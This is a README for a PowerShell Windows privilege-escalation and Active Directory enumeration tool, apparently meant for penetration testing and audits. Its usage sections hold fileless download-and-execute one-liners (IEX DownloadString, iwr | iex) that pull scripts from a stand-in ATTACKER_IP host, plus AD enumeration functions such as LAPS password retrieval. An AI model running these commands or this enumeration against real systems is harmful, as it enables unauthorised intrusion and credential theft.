# WinPrivScope

## Description
WinPrivScope is a Windows security auditing tool designed to systematically identify potential local privilege escalation vectors by analyzing token privileges, kernel patch level, service configurations, and scheduled tasks, with a focus on misconfigurations and weak access controls.

---

## Overview
WinPrivScope is a PowerShell-based **Windows privilege escalation audit tool** intended for security assessments, system hardening, and controlled post-exploitation scenarios.
It performs local enumeration only and does not rely on external dependencies.

---

## Key Features

### Token Privilege Audit
- Identification of high-impact privileges, including:
  - SeImpersonatePrivilege
  - SeBackupPrivilege / SeRestorePrivilege
  - SeDebugPrivilege
  - SeLoadDriverPrivilege
  - SeTakeOwnershipPrivilege

### Kernel & Patch Analysis
- Windows version and build detection
- Enumeration of installed HotFixes
- Correlation of missing patches with known local privilege escalation CVEs

### Service Misconfiguration Analysis
- Writable service binaries
- Writable service directories
- Unquoted service paths
- Weak service permissions via:
  - Service SDDL
  - Registry ACLs

### Scheduled Tasks Analysis
- Enumeration of enabled scheduled tasks
- Detection of writable task binaries and directories
- Identification of tasks running with elevated privileges

---

## Output
- Color-coded findings
- Categorization by attack surface
- Detailed technical context:
  - ACLs
  - SDDL strings
  - File paths
  - Run-as accounts

---

## Requirements
- Windows operating system
- PowerShell 5.1 or later
- Administrative privileges not required

---

## Usage

### Local execution
```powershell
powershell -ExecutionPolicy Bypass -File WinPrivScope.ps1
```
### In-memory execution (IEX)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/WinPrivScope.ps1')
```
### In-memory execution (modern PowerShell)
```powershell
iwr http://ATTACKER_IP/WinPrivScope.ps1 | iex
```

---

## Operational Notes
- Enumeration and auditing only
- No automatic exploitation
- Findings are heuristic-based and require manual validation
- Intended for:
  - Penetration testing
  - Red team operations
  - Blue team audits
  - Windows security training

---

### Extra Script
The repo also contains another Active Directory enumeration script, which I haven't detailed in the readme yet because it's TL;DR, so I'll explain it later. But this is how you use it:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/AD-Enum.ps1')
```
```powershell
# Basic
Invoke-ADEnum
# Full
Invoke-ADEnum -Full
# Full in with output file
Invoke-ADEnum -Full -OutputFile output.txt
```
or single functions
```powershell
# Enumerazione base
Get-DomainInfo
Get-PasswordPolicy
Get-DomainUsers
Get-SPNs
Get-DomainGroups
Get-DomainComputers
Get-OrganizationalUnits

# Full
Get-GPOs
Get-GPOLinks
Get-DomainShares
Get-ACLAbuse
Get-LAPSPasswords
Get-DelegationInfo
Get-ADCSVulnerabilities
Get-LocalAdminAccess
Get-DomainLoggedOnUsers
Get-DomainSessionsWMI
Get-DCOMAccess
Get-RemoteAccessPermissions
```



## Disclaimer
This tool is intended for authorized security testing and educational purposes only.
Use only on systems you own or have explicit permission to test.
The author assumes no responsibility for misuse or unauthorized activity.
